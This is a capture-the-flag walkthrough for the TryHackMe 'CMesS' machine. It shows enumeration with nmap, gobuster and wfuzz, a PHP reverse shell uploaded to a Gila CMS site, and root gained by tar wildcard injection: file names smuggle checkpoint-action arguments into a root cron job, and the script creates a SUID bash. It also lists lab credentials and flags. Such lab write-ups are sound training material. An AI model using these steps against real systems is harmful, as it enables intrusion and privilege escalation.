# IP
10.10.205.14 || `cmess.thm`

## User Flag

- Found two ports running on the machine

```console
❯ nmap -sC -sV cmess.thm | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-16 07:57 IST
Nmap scan report for cmess.thm (10.10.205.14)
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Gila CMS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.65 seconds
```

- It is `Gila` CMS homepage with a `Hello World` post from the admin
- On fuzzing directories with `gobuster` found a login page, but we don't have credentials

```console
❯ gobuster dir --url http://cmess.thm  -w /usr/share/dirb/wordlists/common.txt  | tee gobuster.log
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cmess.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/11/16 08:01:40 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 274]
/.htpasswd            (Status: 403) [Size: 274]
/.htaccess            (Status: 403) [Size: 274]
/0                    (Status: 200) [Size: 3851]
/01                   (Status: 200) [Size: 4078]
/1                    (Status: 200) [Size: 4078]
/1x1                  (Status: 200) [Size: 4078]
/about                (Status: 200) [Size: 3353]
/About                (Status: 200) [Size: 3339]
/admin                (Status: 200) [Size: 1580]
/api                  (Status: 200) [Size: 0]
/assets               (Status: 301) [Size: 318] [--> http://cmess.thm/assets/?url=assets]
/author               (Status: 200) [Size: 3590]
/blog                 (Status: 200) [Size: 3851]
/category             (Status: 200) [Size: 3862]
/cm                   (Status: 500) [Size: 0]
/feed                 (Status: 200) [Size: 735]
/fm                   (Status: 200) [Size: 0]
/index                (Status: 200) [Size: 3851]
/Index                (Status: 200) [Size: 3851]
/lib                  (Status: 301) [Size: 312] [--> http://cmess.thm/lib/?url=lib]
/log                  (Status: 301) [Size: 312] [--> http://cmess.thm/log/?url=log]
/login                (Status: 200) [Size: 1580]
/robots.txt           (Status: 200) [Size: 65]
/Search               (Status: 200) [Size: 3851]
/search               (Status: 200) [Size: 3851]
/server-status        (Status: 403) [Size: 274]
/sites                (Status: 301) [Size: 316] [--> http://cmess.thm/sites/?url=sites]
/src                  (Status: 301) [Size: 312] [--> http://cmess.thm/src/?url=src]
/tag                  (Status: 200) [Size: 3874]
/tags                 (Status: 200) [Size: 3139]
/themes               (Status: 301) [Size: 318] [--> http://cmess.thm/themes/?url=themes]
/tmp                  (Status: 301) [Size: 312] [--> http://cmess.thm/tmp/?url=tmp]

===============================================================
2022/11/16 08:02:51 Finished
===============================================================
```

- Tried fuzzing subdomains with `wfuzz` and found a `dev` subdomain.

```console
❯ wfuzz -c --hw 290 -u http://cmess.thm -H "Host: FUZZ.cmess.thm" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt  | tee wfuzz.log
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://cmess.thm/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000019:   200        30 L     104 W      934 Ch      "dev"

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
```

- Added `dev.cmess.thm` to `/etc/hosts`

- On the homepage of `dev.cmess.thm` found credentials for andre - `andre@cmess.thm:KPFTN_f2yxe%`.

```html
<article>
        <h3>support@cmess.thm</h3>
        <p>Your password has been reset. Here: KPFTN_f2yxe% </p>
</article>
```

- Logged on to the login page we found earlier on `cmess.thm`

- After logging in went `/admin` directory looking for a place to upload reverse shell
- Found [this](https://github.com/jkana/Gila-CMS-1.16.0-shell-upload) github page
- On going to http://cmess.thm/admin/fm?f=tmp/ found a page to upload files.
- We can't upload data to `/tmp`, because we have seen in gobuster that it returns status as 301

```console
/tmp                  (Status: 301) [Size: 312] [--> http://cmess.thm/tmp/?url=tmp
```

- So uploaded shell to `/assets` directory.
- Created php reverse shell.
- Upload the file
- Start netcat listener on the chosen port.
- Access file at http://cmess.thm/assets/php-reverse-shell.php.
- Got a reverse shell

```console
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.17.0.215] from (UNKNOWN) [10.10.205.14] 36776
Linux cmess 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 18:53:52 up 35 min,  0 users,  load average: 0.02, 0.01, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (729): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cmess:/$
```

- Stabilize this shell.
- We are now `www-data`, so we need to escalate our privilege to get user flag.
- Uploaded `linpeas.sh`, found a cronjob with root permission, but we need to be have `mandre` access to exploit it.

```console
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/mandre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

- Found a suspicious backup file

```console
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 161 Nov 15 19:02 /tmp/andre_backup.tar.gz
-rw-r--r-- 1 root root 7867 May  6  2015 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 298768 Dec 29  2015 /usr/share/doc/manpages/Changes.old.gz
<------------snip------------>
-rw-r--r-- 1 root root 190591 Jan 16  2019 /usr/src/linux-headers-4.4.0-142-generic/.config.old
-rw-r--r-- 1 root root 0 Jan 16  2019 /usr/src/linux-headers-4.4.0-142-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Jan 16  2019 /usr/src/linux-headers-4.4.0-142-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 3020 Feb  6  2020 /etc/apt/sources.bak
-rw-r--r-- 1 root root 610 Feb  6  2020 /etc/xml/catalog.old
-rw-r--r-- 1 root root 673 Feb  6  2020 /etc/xml/xml-core.xml.old
-rwxrwxrwx 1 root root 36 Feb  6  2020 /opt/.password.bak <-----suspicious
-rwxrwxrwx 1 root root 866 Jul 10  2019 /var/www/html/src/core/views/admin/db_backup.php
-rwxrwxrwx 1 root root 3773 Jul 10  2019 /var/www/html/src/core/classes/db_backup.php
-rw-r--r-- 1 root root 128 Feb  6  2020 /var/lib/sgml-base/supercatalog.old
-rw-r--r-- 1 root root 9038 Jan 16  2019 /lib/modules/4.4.0-142-generic/kernel/drivers/power/wm831x_backup.ko
-rw-r--r-- 1 root root 9070 Jan 16  2019 /lib/modules/4.4.0-142-generic/kernel/drivers/net/team/team_mode_activebackup.ko
```

- On accessing this file found password for mandre

```console
www-data@cmess:/tmp$ cat /opt/.password.bak
andres backup password
UQfsdCB7aAP6
```

- Secure shelled to machine with Mandre's password and found user flag.

```console
andre@cmess:~$ cat user.txt
thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
```

## Root flag
- We already know about cronjob from `linpeas` output.

```console
andre@cmess:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

- Found [this](https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c) blog.
- Move to backup file.
- Create a shell file which will copy bash to `/tmp`, and will give it SUID rights.

```shell
#!/bin/bash
cp /bin/bash /tmp/shell
chmod +s /tmp/shell
```
- Give shell.sh executable rights.

```console
andre@cmess:~/backup$ chmod +x shell.sh
```
- Then run these command.

```console
andre@cmess:~/backup$ echo "" > "--checkpoint-action=exec=sh shell.sh"
andre@cmess:~/backup$ echo "" > --checkpoint=1
```

- This will be interpreted as

```console
cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz --checkpoint=1 --checkpoint=action=exec=sh shell.sh
```

- Got a shell file in `/tmp` directory.

```console
andre@cmess:/tmp$ ls
andre_backup.tar.gz  linpeas.log  linpeas-new.sh  shell  systemd-private-65bb6ac82e2644b5876085f0cf72c26c-systemd-timesyncd.service-NEJA6o  VMwareDnD
```

- Start this SUID.

```console
andre@cmess:/tmp$ ./shell  -p
shell-4.3# whoami
root
shell-4.3# cat /root/root.txt
thm{9f85b7fdeb2cf96985bf5761a93546a2}
```
